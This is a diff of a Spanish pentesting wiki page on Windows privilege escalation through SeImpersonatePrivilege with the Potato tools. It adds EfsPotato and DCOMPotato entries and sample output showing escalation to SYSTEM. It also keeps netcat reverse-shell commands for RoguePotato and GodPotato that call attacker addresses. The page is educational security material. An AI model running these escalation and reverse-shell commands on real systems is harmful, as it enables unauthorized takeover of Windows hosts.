@@ -30,7 +30,7 @@ Puedes visitar su sitio web y probar su motor de forma **gratuita** en:
 ***
 
 {% hint style="warning" %}
-**JuicyPotato no funciona** en Windows Server 2019 y Windows 10 build 1809 en adelante. Sin embargo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) se pueden usar para **aprovechar los mismos privilegios y obtener acceso a nivel `NT AUTHORITY\SYSTEM`**. Esta [entrada de blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) profundiza en la herramienta `PrintSpoofer`, que se puede usar para abusar de los privilegios de suplantación en hosts de Windows 10 y Server 2019 donde JuicyPotato ya no funciona.
+**JuicyPotato no funciona** en Windows Server 2019 y Windows 10 build 1809 en adelante. Sin embargo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** se pueden usar para **aprovechar los mismos privilegios y obtener acceso a nivel `NT AUTHORITY\SYSTEM`**. Esta [entrada de blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) profundiza en la herramienta `PrintSpoofer`, que se puede usar para abusar de los privilegios de suplantación en hosts de Windows 10 y Server 2019 donde JuicyPotato ya no funciona.
 {% endhint %}
 
 ## Quick Demo
@@ -61,8 +61,8 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f
 {% endcode %}
 
 ### SharpEfsPotato
-```
-SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
+```bash
+> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
 SharpEfsPotato by @bugch3ck
 Local privilege escalation from SeImpersonatePrivilege using EfsRpc.
 
@@ -79,11 +79,34 @@ df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
 C:\temp>type C:\temp\w.log
 nt authority\system
 ```
+### EfsPotato
+```bash
+> EfsPotato.exe "whoami"
+Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
+Part of GMH's fuck Tools, Code By zcgonvh.
+CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]
+
+[+] Current user: NT Service\MSSQLSERVER
+[+] Pipe: \pipe\lsarpc
+[!] binding ok (handle=aeee30)
+[+] Get Token: 888
+[!] process with pid: 3696 created.
+==============================
+[x] EfsRpcEncryptFileSrv failed: 1818
+
+nt authority\system
+```
 ### GodPotato
+```bash
+> GodPotato -cmd "cmd /c whoami"
+# You can achieve a reverse shell like this.
+> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
-GodPotato -cmd "cmd /c whoami"
-GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
-```
+### DCOMPotato
+
+![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)
+
+
 ## Referencias
 
 * [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
@@ -91,12 +114,14 @@ GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 * [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
 * [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
 * [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
+* [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
+* [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
 
 ### [WhiteIntel](https://whiteintel.io)
 
 <figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) es un motor de búsqueda alimentado por la **dark-web** que ofrece funcionalidades **gratuitas** para verificar si una empresa o sus clientes han sido **comprometidos** por **malwares robadores**.
+[**WhiteIntel**](https://whiteintel.io) es un motor de búsqueda alimentado por la **dark-web** que ofrece funcionalidades **gratuitas** para verificar si una empresa o sus clientes han sido **comprometidos** por **malware de robo**.
 
 Su objetivo principal de WhiteIntel es combatir la toma de cuentas y los ataques de ransomware resultantes de malware que roba información.
 
